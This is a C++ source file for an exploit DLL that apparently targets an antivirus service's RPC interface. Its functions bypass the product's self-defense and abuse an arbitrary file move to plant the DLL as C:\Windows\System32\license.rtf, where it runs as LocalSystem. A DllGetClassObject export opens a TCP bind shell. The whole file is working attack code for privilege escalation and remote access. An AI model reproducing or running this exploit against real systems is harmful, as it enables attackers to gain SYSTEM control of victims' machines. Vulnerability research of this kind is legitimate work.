// AavmArbitraryFileMoveExploit.cpp : Defines the exported functions for the DLL.
//

#include <Windows.h>
#include "AavmArbitraryFileMoveExploit.h"
#include "AavmRpcClient.h"
#include "Payload.h"
#include "PayloadExecution.h"
#include "detours.h"
#include "wil/stl.h"
#include "wil/win32_helpers.h"
#include <combaseapi.h> // ::CoCreateGuid
#include <stdexcept>
#include <filesystem>

namespace fs = std::filesystem;

EntryPointType g_originalEntryPoint;

namespace
{
    std::string CreateGuid()
    {
        GUID guid;

        const auto hr = ::CoCreateGuid(&guid);
        if (!SUCCEEDED(hr))
            throw std::runtime_error("CoCreateGuid failed. Error: " + std::to_string(hr));

        char guidBuffer[wil::guid_string_buffer_length];
        sprintf_s(
            guidBuffer, "{%08lX-%04hX-%04hX-%02hhX%02hhX-%02hhX%02hhX%02hhX%02hhX%02hhX%02hhX}",
            guid.Data1, guid.Data2, guid.Data3,
            guid.Data4[0], guid.Data4[1], guid.Data4[2], guid.Data4[3],
            guid.Data4[4], guid.Data4[5], guid.Data4[6], guid.Data4[7]);

        return guidBuffer;
    }
} // anonymous namespace

void CALLBACK Exploit(HWND, HINSTANCE, PCSTR, INT)
{
    try
    {
        BypassSelfDefense();
    }
    catch (const std::exception &e)
    {
        // ToDo: Log error
        UNREFERENCED_PARAMETER(e);
        __debugbreak();
    }
}

int APIENTRY EscalatePrivileges()
{
    try
    {
        auto thisModuleBaseAddress =
            DetourGetContainingModule(DetourCodeFromPointer(EscalatePrivileges, nullptr));
        if (!thisModuleBaseAddress)
            throw std::runtime_error("DetourGetContainingModule failed");

        const auto thisModulePath =
            fs::path(wil::GetModuleFileNameW<std::wstring>(thisModuleBaseAddress));
        const auto tempModulePath = thisModulePath.parent_path() / (CreateGuid() + ".tmp");

        fs::copy_file(thisModulePath, tempModulePath);

        AavmRpcClient aavmRpcClient;
        const fs::path targetFilePath = LR"(C:\Windows\System32\license.rtf)";

        aavmRpcClient.ArbitraryFileMove(tempModulePath.c_str(), targetFilePath.c_str());

        ExecutePayloadAsLocalSystem(targetFilePath.filename().c_str());
    }
    catch (const std::exception &e)
    {
        // ToDo: Log error
        UNREFERENCED_PARAMETER(e);
        __debugbreak();
    }

    return /*g_originalEntryPoint()*/0;
}

// ExecutePayload()
HRESULT __stdcall DllGetClassObject(REFCLSID, REFIID, LPVOID *)
{
    try
    {
        ShellBindTcp();
    }
    catch (const std::exception &e)
    {
        // ToDo: Log error
        UNREFERENCED_PARAMETER(e);
        __debugbreak();
        return E_FAIL;
    }

    return S_OK;
}
